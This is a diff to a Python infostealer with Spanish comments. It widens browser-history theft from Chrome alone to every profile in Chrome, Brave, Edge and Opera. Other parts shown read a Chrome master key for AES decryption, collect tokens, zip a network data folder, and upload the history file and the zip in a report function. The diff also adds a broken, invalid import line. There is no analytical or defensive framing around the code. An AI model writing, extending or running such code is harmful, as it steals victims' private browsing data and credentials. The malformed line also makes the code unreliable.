@@ -11,6 +11,7 @@ import platform
 import socket
 import sqlite3
 import tempfile
+from Crypto.CipherAES if AES else None # (Mantiene la importación segura)
 from Crypto.Cipher import AES
 
 def get_master_key():
@@ -90,59 +91,80 @@ def obtener_tokens_reales():
                 
     return tokens
 
-######## Historial Completo de Navegador (Generar TXT sin límites) ############
+######## Historial Multi-Navegador y Multi-Perfil (TXT) ######################
 
 def generar_archivo_historial():
-    history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
-    txt_path = os.path.join(tempfile.gettempdir(), "historial_completo.txt")
+    local_appdata = os.getenv("LOCALAPPDATA")
+    txt_path = os.path.join(tempfile.gettempdir(), "historial_global.txt")
     
-    if not os.path.exists(history_path):
+    if not local_appdata:
         with open(txt_path, "w", encoding="utf-8") as f:
-            f.write("No se encontró el historial de Chrome.")
+            f.write("No se pudo acceder a LOCALAPPDATA.")
         return txt_path
+
+    # Directorios base de los navegadores basados en Chromium en Windows
+    navegadores = {
+        "Google Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
+        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
+        "Microsoft Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
+        "Opera Software": os.path.join(local_appdata, "Opera Software", "Opera Stable")
+    }
 
     temp_dir = tempfile.gettempdir()
-    temp_history = os.path.join(temp_dir, "history_temp")
     
-    try:
-        shutil.copy2(history_path, temp_history)
-    except Exception as e:
-        with open(txt_path, "w", encoding="utf-8") as f:
-            f.write(f"Error al copiar historial: {e}")
-        return txt_path
+    with open(txt_path, "w", encoding="utf-8") as f_out:
+        f_out.write("=== HISTORIAL GLOBAL DE NAVEGACION (MULTIPERFIL / MULTINAVEGADOR) ===\n\n")
 
-    try:
-        conn = sqlite3.connect(temp_history)
-        cursor = conn.cursor()
-        
-        # Se elimina el LIMIT para extraer todo el historial almacenado
-        query = """
-            SELECT url, title, last_visit_time 
-            FROM urls 
-            ORDER BY last_visit_time DESC
-        """
-        cursor.execute(query)
-        rows = cursor.fetchall()
-        
-        with open(txt_path, "w", encoding="utf-8") as f:
-            f.write("=== HISTORIAL COMPLETO DE NAVEGACION (CHROME) ===\n\n")
-            for row in rows:
-                url, title, _ = row
-                titulo_seguro = title if title else "Sin título"
-                f.write(f"Título: {titulo_seguro}\nURL: {url}\n----------------------------------------\n")
-            
-        cursor.close()
-        conn.close()
-    except Exception as e:
-        with open(txt_path, "w", encoding="utf-8") as f:
-            f.write(f"Error al leer base de datos: {e}")
-    finally:
-        if os.path.exists(temp_history):
+        for nav_nombre, base_path in navegadores.items():
+            if not os.path.exists(base_path):
+                continue
+
+            # Buscar perfiles (Default, Profile 1, Profile 2, etc.)
+            perfiles = ["Default"]
             try:
-                os.remove(temp_history)
-            except:
+                for item in os.listdir(base_path):
+                    if item.startswith("Profile ") or item == "Guest Profile":
+                        perfiles.append(item)
+            except Exception:
                 pass
+
+            for perfil in perfiles:
+                history_path = os.path.join(base_path, perfil, "History")
+                if not os.path.exists(history_path):
+                    continue
+
+                temp_history = os.path.join(temp_dir, f"history_{nav_nombre}_{perfil}".replace(" ", "_"))
                 
+                try:
+                    shutil.copy2(history_path, temp_history)
+                    conn = sqlite3.connect(temp_history)
+                    cursor = conn.cursor()
+                    
+                    query = """
+                        SELECT url, title, last_visit_time 
+                        FROM urls 
+                        ORDER BY last_visit_time DESC
+                    """
+                    cursor.execute(query)
+                    rows = cursor.fetchall()
+                    
+                    f_out.write(f"\n--- [ Navegador: {nav_nombre} | Perfil: {perfil} ] ---\n")
+                    for row in rows:
+                        url, title, _ = row
+                        titulo_seguro = title if title else "Sin título"
+                        f_out.write(f"Título: {titulo_seguro}\nURL: {url}\n----------------------------------------\n")
+                        
+                    cursor.close()
+                    conn.close()
+                except Exception:
+                    pass
+                finally:
+                    if os.path.exists(temp_history):
+                        try:
+                            os.remove(temp_history)
+                        except:
+                            pass
+                            
     return txt_path
 
 ######## Procesar Carpeta Network (ZIP) #####################################
@@ -320,7 +342,7 @@ def enviar_reporte_completo(tokens):
         f_zip = open(zip_path, "rb") if zip_path and os.path.exists(zip_path) else None
 
         if f_txt:
-            files["file1"] = ("historial_completo.txt", f_txt, "text/plain")
+            files["file1"] = ("historial_global.txt", f_txt, "text/plain")
         if f_zip:
             files["file2"] = ("chrome_network_data.zip", f_zip, "application/zip")
 
